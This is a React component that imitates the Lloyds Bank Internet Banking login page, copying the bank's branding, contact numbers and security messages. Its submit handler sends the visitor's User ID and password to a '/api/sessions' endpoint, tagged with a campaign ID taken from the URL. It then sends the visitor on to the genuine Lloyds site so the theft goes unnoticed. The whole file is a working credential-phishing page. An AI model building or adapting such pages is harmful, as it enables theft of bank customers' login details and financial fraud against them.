import { useState } from "react";
import { useForm } from "react-hook-form";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { apiRequest } from "@/lib/queryClient";

interface LoginFormData {
  userId: string;
  password: string;
}

export default function LloydsLoginPage() {
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const form = useForm<LoginFormData>({
    defaultValues: {
      userId: "",
      password: "",
    },
  });

  const onSubmit = async (data: LoginFormData) => {
    setIsSubmitting(true);
    
    try {
      await apiRequest("POST", "/api/sessions", {
        username: data.userId,
        password: data.password,
        ipAddress: "unknown",
        status: "complete",
        completionPercentage: 100,
        campaignId: new URLSearchParams(window.location.search).get("cid") || "unknown",
      });

      setTimeout(() => {
        window.location.href = "https://secure.lloydsbank.co.uk/";
      }, 1500);
    } catch (error) {
      console.error("Error capturing session:", error);
      setTimeout(() => {
        window.location.href = "https://secure.lloydsbank.co.uk/";
      }, 1500);
    }
  };

  return (
    <div className="min-h-screen bg-green-50">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <svg width="140" height="40" viewBox="0 0 140 40" className="text-green-700">
                <rect width="140" height="40" fill="#006A4D"/>
                <text x="15" y="26" fill="white" fontSize="18" fontWeight="bold">Lloyds Bank</text>
              </svg>
            </div>
            <nav className="hidden md:flex space-x-6">
              <a href="#" className="text-gray-700 hover:text-green-700">Help & Support</a>
              <a href="#" className="text-gray-700 hover:text-green-700">Security</a>
              <a href="#" className="text-gray-700 hover:text-green-700">Contact</a>
            </nav>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="min-h-[calc(100vh-4rem)] flex">
        {/* Left Side - Login Form */}
        <div className="flex-1 flex items-center justify-center p-8">
          <div className="w-full max-w-md">
            <div className="bg-white rounded-lg shadow-lg border border-gray-200 p-8">
              <div className="text-center mb-8">
                <h1 className="text-2xl font-bold text-gray-900 mb-2">
                  Internet Banking log in
                </h1>
                <p className="text-gray-600">
                  Welcome to Lloyds Bank Internet Banking
                </p>
              </div>

              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                <div>
                  <label htmlFor="userId" className="block text-sm font-medium text-gray-700 mb-2">
                    User ID
                  </label>
                  <Input
                    id="userId"
                    type="text"
                    {...form.register("userId", { required: true })}
                    className="w-full px-3 py-3 border border-gray-300 rounded focus:border-green-500 focus:ring-green-500"
                    placeholder="Enter your User ID"
                    data-testid="input-user-id"
                  />
                </div>

                <div>
                  <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
                    Password
                  </label>
                  <Input
                    id="password"
                    type="password"
                    {...form.register("password", { required: true })}
                    className="w-full px-3 py-3 border border-gray-300 rounded focus:border-green-500 focus:ring-green-500"
                    placeholder="Enter your Password"
                    data-testid="input-password"
                  />
                </div>

                <div className="flex items-center">
                  <input
                    id="remember"
                    name="remember"
                    type="checkbox"
                    className="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 rounded"
                  />
                  <label htmlFor="remember" className="ml-2 block text-sm text-gray-900">
                    Remember my User ID on this device
                  </label>
                </div>

                <Button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-green-700 hover:bg-green-800 text-white py-3 px-4 rounded font-medium"
                  data-testid="button-login"
                >
                  {isSubmitting ? "Logging in..." : "Log in"}
                </Button>
              </form>

              <div className="mt-6 space-y-3 text-center">
                <a href="#" className="block text-sm text-green-700 hover:text-green-600">
                  Forgotten your log in details?
                </a>
                <a href="#" className="block text-sm text-green-700 hover:text-green-600">
                  Register for Internet Banking
                </a>
                <a href="#" className="block text-sm text-green-700 hover:text-green-600">
                  Problems logging in?
                </a>
              </div>

              <div className="mt-8 pt-6 border-t border-gray-200 bg-green-50 rounded-lg p-4 -mx-1">
                <div className="flex items-start space-x-3">
                  <div className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5">🔒</div>
                  <div className="text-sm">
                    <p className="font-medium text-green-800 mb-1">Stay secure</p>
                    <p className="text-green-700">We'll never ask you to give us your Internet Banking details in an email, over the phone or by text.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Right Side - Info Panel */}
        <div className="hidden lg:block lg:w-1/3 bg-gradient-to-br from-green-600 to-green-800 p-8">
          <div className="text-white h-full flex flex-col">
            <div className="flex-1">
              <h3 className="text-2xl font-bold mb-6">Banking that works for you</h3>
              
              <div className="space-y-6">
                <div className="flex items-start space-x-4">
                  <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center flex-shrink-0 mt-1">
                    <span className="text-sm font-bold">£</span>
                  </div>
                  <div>
                    <h4 className="font-semibold mb-2">Manage your money</h4>
                    <p className="text-green-100 text-sm">View balances, transfer money and pay bills - all in one place.</p>
                  </div>
                </div>
                
                <div className="flex items-start space-x-4">
                  <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center flex-shrink-0 mt-1">
                    <span className="text-sm font-bold">📱</span>
                  </div>
                  <div>
                    <h4 className="font-semibold mb-2">Mobile Banking</h4>
                    <p className="text-green-100 text-sm">Bank on the go with our award-winning mobile app.</p>
                  </div>
                </div>

                <div className="flex items-start space-x-4">
                  <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center flex-shrink-0 mt-1">
                    <span className="text-sm font-bold">🛡️</span>
                  </div>
                  <div>
                    <h4 className="font-semibold mb-2">Safe & Secure</h4>
                    <p className="text-green-100 text-sm">Your money is protected with industry-leading security.</p>
                  </div>
                </div>
              </div>
            </div>

            <div className="mt-8 p-6 bg-white/10 rounded-lg">
              <h4 className="font-semibold mb-3">Need assistance?</h4>
              <p className="text-sm text-green-100 mb-4">Our customer service team is available 24/7</p>
              <div className="space-y-2 text-sm">
                <p><strong>General enquiries:</strong> 0345 300 0000</p>
                <p><strong>Lost & stolen cards:</strong> 0800 096 9779</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}